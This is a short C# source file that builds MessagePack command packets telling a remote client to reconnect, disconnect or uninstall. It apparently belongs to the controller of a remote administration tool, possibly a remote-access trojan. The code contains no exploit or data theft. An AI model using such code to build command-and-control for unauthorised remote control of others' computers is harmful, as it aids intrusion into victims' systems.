using Axeno.MessagePack;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Axeno.Networking.Functions
{
    internal class ClientControl
    {
        public static byte[] Reconnect()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ReconnectClient";

            return msgpack.Encode2Bytes();
        }
        public static byte[] Disconnect()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "DisconnectClient";

            return msgpack.Encode2Bytes();
        }
        public static byte[] Uninstall()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "UninstallClient";

            return msgpack.Encode2Bytes();
        }
    }
}
